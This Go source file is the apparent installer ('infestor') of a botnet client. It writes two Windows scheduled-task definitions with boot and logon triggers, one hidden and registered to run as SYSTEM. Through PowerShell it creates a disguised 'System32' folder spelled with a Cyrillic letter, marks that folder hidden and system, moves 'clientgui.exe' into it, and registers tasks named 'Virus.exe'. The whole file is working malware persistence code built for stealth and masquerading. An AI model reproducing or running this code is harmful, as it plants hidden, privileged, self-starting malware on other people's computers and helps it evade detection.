package main

/*
go build -o infestor.exe .\botnet\botnet_files\\infestor.go

*/
import (
	"fmt"
	"os"
	"os/exec"
)

func coding_resurect(mes []byte) string {
	//cmd и powershell используют странную кодировку
	first_arr := []rune("АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмноп") //128-175
	second_arr := []rune("рстуфхцчшщъыьэюяЁё")                              //224-241
	res := ""
	for i := 0; i < len(mes); i++ {
		if (128 <= mes[i]) && (mes[i] <= 176) {
			res += string(first_arr[mes[i]-128])
		} else if (224 <= mes[i]) && (mes[i] <= 241) {
			res += string(second_arr[mes[i]-224])
		} else {
			res += string(mes[i])
		}

	}
	return res
}

func main() {
	file, _ := os.Create("some task.xml")
	fmt.Fprint(file, `<?xml version="1.0" encoding="UTF-16"?>
	<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	  <RegistrationInfo>
		<Date>2021-04-29T11:29:13.7272855</Date>
		<Author>t.me/ch4nnel1</Author>
		<URI>\Virus.exe</URI>
	  </RegistrationInfo>
	  <Triggers>
		<BootTrigger>
		  <Enabled>true</Enabled>
		</BootTrigger>
	  </Triggers>
	  <Principals>
		<Principal id="Author">
		  <UserId>S-1-5-21-1046398344-1943296124-647174395-1002</UserId>
		  <LogonType>Password</LogonType>
		  <RunLevel>LeastPrivilege</RunLevel>
		</Principal>
	  </Principals>
	  <Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
		<AllowHardTerminate>false</AllowHardTerminate>
		<StartWhenAvailable>false</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
		  <StopOnIdleEnd>true</StopOnIdleEnd>
		  <RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
	  </Settings>
	  <Actions Context="Author">
		<Exec>
		  <Command>C:\Windows\Sуstem32\clientgui.exe</Command>
		</Exec>
	  </Actions>
	</Task>`)
	file.Close()
	file, _ = os.Create("some task1.xml")
	fmt.Fprint(file, `<?xml version="1.0" encoding="UTF-16"?>
	<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	  <RegistrationInfo>
		<Date>2021-04-29T11:30:14.8538915</Date>
		<Author>t.me/ch4nnel1</Author>
		<URI>\Virus1.exe</URI>
	  </RegistrationInfo>
	  <Triggers>
		<LogonTrigger>
		  <Enabled>true</Enabled>
		</LogonTrigger>
	  </Triggers>
	  <Principals>
		<Principal id="Author">
		  <GroupId>S-1-5-32-545</GroupId>
		  <RunLevel>HighestAvailable</RunLevel>
		</Principal>
	  </Principals>
	  <Settings>
		<MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
		<AllowHardTerminate>true</AllowHardTerminate>
		<StartWhenAvailable>false</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
		  <StopOnIdleEnd>true</StopOnIdleEnd>
		  <RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
	  </Settings>
	  <Actions Context="Author">
		<Exec>
		  <Command>C:\Windows\Sуstem32\clientgui.exe</Command>
		</Exec>
	  </Actions>
	</Task>`)
	file.Close()
	cmd := exec.Command("powershell", "/C", `mkdir "C:\Windows\Sуstem32";ATTRIB +H +S "C:\Windows\Sуstem32";mv ".\clientgui.exe" "C:\Windows\Sуstem32\clientgui.exe";mv ".\some task.xml" "C:\Windows\Sуstem32\some task.xml";mv ".\some task1.xml" "C:\Windows\Sуstem32\some task1.xml"; schtasks /create /tn "Virus.exe" /ru SYSTEM /xml "C:\Windows\Sуstem32\some task.xml"; schtasks /create /tn "Virus1.exe" /xml "C:\Windows\Sуstem32\some task1.xml"`)
	fmt.Println("Maybe all good")
	output, _ := cmd.CombinedOutput()
	fmt.Println(coding_resurect(output))
	w := 0
	fmt.Scanf("%d", &w)

}
